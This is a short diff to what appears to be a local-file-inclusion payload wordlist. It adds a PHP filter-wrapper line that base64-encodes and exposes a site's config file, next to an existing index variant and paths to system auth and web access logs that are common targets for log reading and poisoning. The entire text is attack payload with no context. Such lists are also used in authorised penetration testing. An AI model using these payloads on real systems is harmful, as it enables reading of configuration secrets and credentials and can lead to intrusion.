@@ -1,4 +1,5 @@
 php://filter/convert.base64-encode/resource=index
+php://filter/convert.base64-encode/resource=config
 /var/log/auth
 /var/log/auth.log
 /var/log/durian.log/access.log
